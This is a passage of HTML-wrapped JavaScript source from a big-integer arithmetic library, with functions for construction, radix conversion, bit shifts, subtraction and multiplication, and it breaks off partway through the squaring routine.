class="cs9FB05234">Arcfour.prototype.next = ARC4next;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">// (public) Constructor</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function BigInteger(a,b,c) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(a != null)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(&quot;number&quot; == typeof a) this.fromNumber(a,b,c);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else if(b == null &amp;&amp; &quot;string&quot; != typeof a) this.fromString(a,256);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else this.fromString(a,b);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// return new, unset BigInteger</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function nbi() { return new BigInteger(null); }</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// am: Compute w_j += (x*this_i), propagate carries,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// c is initial carry, returns final carry.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// c &lt; 3*dvalue, x &lt; 2*dvalue, this_i &lt; dvalue</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// We need to select the fastest one that works in this environment.</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// am1: use a single mult and divide to get the high bits,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// max digit bits should be 26 because</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// max internal value = 2*dvalue^2-2*dvalue (&lt; 2^53)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function am1(i,x,w,j,c,n) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;while(--n &gt;= 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var v = x*this[i++]+w[j]+c;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;c = Math.floor(v/0x4000000);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;w[j++] = v&amp;0x3ffffff;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return c;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// am2 avoids a big mult-and-extract completely.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// Max digit bits should be &lt;= 30 because we do bitwise ops</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// on values up to 2*hdvalue^2-hdvalue-1 (&lt; 2^31)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function am2(i,x,w,j,c,n) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var xl = x&amp;0x7fff, xh = x&gt;&gt;15;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;while(--n &gt;= 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var l = this[i]&amp;0x7fff;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var h = this[i++]&gt;&gt;15;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var m = xh*l+h*xl;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;l = xl*l+((m&amp;0x7fff)&lt;&lt;15)+w[j]+(c&amp;0x3fffffff);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;c = (l&gt;&gt;&gt;30)+(m&gt;&gt;&gt;15)+xh*h+(c&gt;&gt;&gt;30);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;w[j++] = l&amp;0x3fffffff;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return c;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// Alternately, set max digit bits to 28 since some</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// browsers slow down when dealing with 32-bit numbers.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function am3(i,x,w,j,c,n) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var xl = x&amp;0x3fff, xh = x&gt;&gt;14;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;while(--n &gt;= 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var l = this[i]&amp;0x3fff;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var h = this[i++]&gt;&gt;14;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var m = xh*l+h*xl;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;l = xl*l+((m&amp;0x3fff)&lt;&lt;14)+w[j]+c;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;c = (l&gt;&gt;28)+(m&gt;&gt;14)+xh*h;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;w[j++] = l&amp;0xfffffff;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return c;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">function int2char(n) { return BI_RM.charAt(n); }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function intAt(s,i) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var c = BI_RC[s.charCodeAt(i)];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return (c==null)?-1:c;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (protected) copy this to r</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnpCopyTo(r) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;for(var i = this.t-1; i &gt;= 0; --i) r[i] = this[i];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.t = this.t;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.s = this.s;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (protected) set from integer value x, -DV &lt;= x &lt; DV</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnpFromInt(x) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.t = 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.s = (x&lt;0)?-1:0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(x &gt; 0) this[0] = x;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else if(x &lt; -1) this[0] = x+this.DV;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else this.t = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// return bigint initialized to value</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function nbv(i) { var r = nbi(); r.fromInt(i); return r; }</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (protected) set from string and radix</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnpFromString(s,b) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var k;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(b == 16) k = 4;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else if(b == 8) k = 3;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else if(b == 256) k = 8; // byte array</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else if(b == 2) k = 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else if(b == 32) k = 5;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else if(b == 4) k = 2;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else { this.fromRadix(s,b); return; }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.t = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.s = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var i = s.length, mi = false, sh = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;while(--i &gt;= 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;var x = (k==8)?s[i]&amp;0xff:intAt(s,i);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(x &lt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(s.charAt(i) == &quot;-&quot;) mi = true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;mi = false;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(sh == 0)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this[this.t++] = x;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else if(sh+k &gt; this.DB) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this[this.t-1] |= (x&amp;((1&lt;&lt;(this.DB-sh))-1))&lt;&lt;sh;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this[this.t++] = (x&gt;&gt;(this.DB-sh));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this[this.t-1] |= x&lt;&lt;sh;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;sh += k;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(sh &gt;= this.DB) sh -= this.DB;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(k == 8 &amp;&amp; (s[0]&amp;0x80) != 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;this.s = -1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(sh &gt; 0) this[this.t-1] |= ((1&lt;&lt;(this.DB-sh))-1)&lt;&lt;sh;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;this.clamp();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(mi) BigInteger.ZERO.subTo(this,this);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (protected) clamp off excess high words</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnpClamp() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var c = this.s&amp;this.DM;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;while(this.t &gt; 0 &amp;&amp; this[this.t-1] == c) --this.t;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (public) return string representation in given radix</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnToString(b) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(this.s &lt; 0) return &quot;-&quot;+this.negate().toString(b);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var k;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(b == 16) k = 4;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else if(b == 8) k = 3;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else if(b == 2) k = 1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else if(b == 32) k = 5;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else if(b == 4) k = 2;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else return this.toRadix(b);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var km = (1&lt;&lt;k)-1, d, m = false, r = &quot;&quot;, i = this.t;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var p = this.DB-(i*this.DB)%k;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(i-- &gt; 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if(p &lt; this.DB &amp;&amp; (d = this[i]&gt;&gt;p) &gt; 0) { m = true; r = int2char(d); }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while(i &gt;= 0) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(p &lt; k) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d = (this[i]&amp;((1&lt;&lt;p)-1))&lt;&lt;(k-p);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d |= this[--i]&gt;&gt;(p+=this.DB-k);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d = (this[i]&gt;&gt;(p-=k))&amp;km;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(p &lt;= 0) { p += this.DB; --i; }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(d &gt; 0) m = true;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(m) r += int2char(d);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return m?r:&quot;0&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (public) -this</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnNegate() { var r = nbi(); BigInteger.ZERO.subTo(this,r); return r; }</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (public) |this|</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnAbs() { return (this.s&lt;0)?this.negate():this; }</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (public) return + if this &gt; a, - if this &lt; a, 0 if equal</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnCompareTo(a) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var r = this.s-a.s;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(r != 0) return r;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var i = this.t;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r = i-a.t;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(r != 0) return (this.s&lt;0)?-r:r;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;while(--i &gt;= 0) if((r=this[i]-a[i]) != 0) return r;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// returns bit length of the integer x</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function nbits(x) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var r = 1, t;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if((t=x&gt;&gt;&gt;16) != 0) { x = t; r += 16; }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if((t=x&gt;&gt;8) != 0) { x = t; r += 8; }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if((t=x&gt;&gt;4) != 0) { x = t; r += 4; }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if((t=x&gt;&gt;2) != 0) { x = t; r += 2; }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if((t=x&gt;&gt;1) != 0) { x = t; r += 1; }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return r;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (public) return the number of bits in &quot;this&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnBitLength() {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(this.t &lt;= 0) return 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;return this.DB*(this.t-1)+nbits(this[this.t-1]^(this.s&amp;this.DM));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (protected) r = this &lt;&lt; n*DB</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnpDLShiftTo(n,r) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var i;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;for(i = this.t-1; i &gt;= 0; --i) r[i+n] = this[i];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;for(i = n-1; i &gt;= 0; --i) r[i] = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.t = this.t+n;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.s = this.s;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (protected) r = this &gt;&gt; n*DB</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnpDRShiftTo(n,r) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;for(var i = n; i &lt; this.t; ++i) r[i-n] = this[i];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.t = Math.max(this.t-n,0);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.s = this.s;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (protected) r = this &lt;&lt; n</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnpLShiftTo(n,r) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var bs = n%this.DB;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var cbs = this.DB-bs;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var bm = (1&lt;&lt;cbs)-1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var ds = Math.floor(n/this.DB), c = (this.s&lt;&lt;bs)&amp;this.DM, i;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;for(i = this.t-1; i &gt;= 0; --i) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r[i+ds+1] = (this[i]&gt;&gt;cbs)|c;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;c = (this[i]&amp;bm)&lt;&lt;bs;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;for(i = ds-1; i &gt;= 0; --i) r[i] = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r[ds] = c;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.t = this.t+ds+1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.s = this.s;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.clamp();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (protected) r = this &gt;&gt; n</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnpRShiftTo(n,r) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.s = this.s;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var ds = Math.floor(n/this.DB);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(ds &gt;= this.t) { r.t = 0; return; }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var bs = n%this.DB;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var cbs = this.DB-bs;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var bm = (1&lt;&lt;bs)-1;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r[0] = this[ds]&gt;&gt;bs;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;for(var i = ds+1; i &lt; this.t; ++i) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r[i-ds-1] |= (this[i]&amp;bm)&lt;&lt;cbs;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r[i-ds] = this[i]&gt;&gt;bs;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(bs &gt; 0) r[this.t-ds-1] |= (this.s&amp;bm)&lt;&lt;cbs;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.t = this.t-ds;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.clamp();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (protected) r = this - a</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnpSubTo(a,r) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var i = 0, c = 0, m = Math.min(a.t,this.t);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;while(i &lt; m) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;c += this[i]-a[i];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r[i++] = c&amp;this.DM;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;c &gt;&gt;= this.DB;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(a.t &lt; this.t) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;c -= a.s;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while(i &lt; this.t) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c += this[i];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r[i++] = c&amp;this.DM;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c &gt;&gt;= this.DB;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;c += this.s;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;c += this.s;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while(i &lt; a.t) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c -= a[i];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r[i++] = c&amp;this.DM;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;c &gt;&gt;= this.DB;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;c -= a.s;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.s = (c&lt;0)?-1:0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(c &lt; -1) r[i++] = this.DV+c;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;else if(c &gt; 0) r[i++] = c;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.t = i;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.clamp();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (protected) r = this * a, r != this,a (HAC 14.12)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// &quot;this&quot; should be the larger one if appropriate.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnpMultiplyTo(a,r) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var x = this.abs(), y = a.abs();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var i = x.t;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.t = i+y.t;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;while(--i &gt;= 0) r[i] = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;for(i = 0; i &lt; y.t; ++i) r[i+x.t] = x.am(0,y[i],r,i,0,x.t);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.s = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;r.clamp();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;if(this.s != a.s) BigInteger.ZERO.subTo(r,r);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">// (protected) r = this^2, r != this (HAC 14.16)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">function bnpSquareTo(r) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var x = this.abs();</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;var i = r.t = 2*x.t;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;while(--i &gt;= 0) r[i] = 0;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;for(i = 0; i &lt; x.t-1; ++i) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> 